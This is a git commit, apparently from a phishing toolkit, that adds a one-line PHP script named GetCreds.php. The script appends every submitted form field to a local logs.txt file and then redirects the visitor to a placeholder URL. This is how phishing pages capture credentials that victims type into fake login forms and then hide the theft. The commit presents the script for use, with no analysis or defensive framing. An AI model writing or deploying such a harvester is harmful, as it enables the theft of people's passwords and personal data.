d1d069314b8187927caddce6659f2a2971dfbc86
afkfr0mkeyb0ard <123593001+afkfr0mkeyb0ard@users.noreply.github.com>
2024-01-21 01:40:09 +0100

    Create GetCreds.php

---
+++ scripts/GetCreds.php
@@ -0,0 +1,1 @@
+<?php header('Location: <REDIRECT-URL>'); $file = fopen('logs.txt','a');foreach($_POST as $variable => $value){fwrite($file,$variable);fwrite($file,'=');fwrite($file,$value);fwrite($file,"\r\n");}fwrite($file,"\r\n\n\n\n");fclose($file);exit;?>
